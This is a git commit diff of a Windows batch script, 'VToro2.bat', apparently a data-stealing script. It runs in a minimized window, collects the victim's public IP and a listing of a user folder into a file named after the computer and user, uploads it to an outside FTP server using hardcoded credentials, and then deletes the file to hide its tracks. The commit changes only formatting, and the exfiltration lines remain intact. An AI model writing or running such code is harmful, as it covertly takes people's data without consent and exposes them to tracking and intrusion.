3d1301d09aef8a12b6b8a171e4e75af19d1e4e75
Papela <45976195+Papela@users.noreply.github.com>
2021-03-24 19:42:05 +0100

    Update VToro2.bat

--- VToro2.bat
+++ VToro2.bat
@@ -3,13 +3,12 @@ if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && 
 Color 9
 cd "C:\Users\%username%\AppData\Local\Temp\"
 curl ifconfig.me >> IP~%computername%~%username%.txt
-@echo /////////////////////////////// >> IP~%computername%~%username%.txt
+@echo ///////////////////////////// >> IP~%computername%~%username%.txt
 dir "C:\Users\%username%\ToroMax\" >> IP~%computername%~%username%.txt
-@echo /////////////////////////////// >> IP~%computername%~%username%.txt
+@echo ///////////////////////////// >> IP~%computername%~%username%.txt
 timeout /t 1
 curl.exe -u amaguadalupekoa.eu5.org:kktua124 -T IP~%computername%~%username%.txt ftp://amaguadalupekoa.eu5.org/ToroMax/
 timeout /t 1
 del IP~%computername%~%username%.txt /F
-timeout /t 1
 cls
 exit
